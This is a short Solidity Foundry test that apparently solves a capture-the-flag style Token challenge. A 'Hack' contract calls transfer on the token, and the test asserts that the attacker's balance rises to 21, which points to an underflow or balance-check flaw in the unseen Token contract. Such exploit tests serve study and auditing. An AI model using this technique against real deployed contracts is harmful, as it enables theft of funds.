// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test , console} from "forge-std/Test.sol";

import {Token} from "../src/Token.sol";

contract TokenTest is Test {

    Token tok;

    Hack hak;

    function setUp() public {

        tok = new Token(20);
        hak = new Hack(tok);

    }

    function testIncrementtoken() public {

        vm.prank(address(hak));
        hak.attack();


        assert(tok.balanceOf(address(hak)) == 21);
        
    }
}

contract Hack {


    Token tok;

    constructor(Token _tok) {

        tok = _tok;
    }

    function attack() public {

        tok.transfer(msg.sender, 1);

    }
}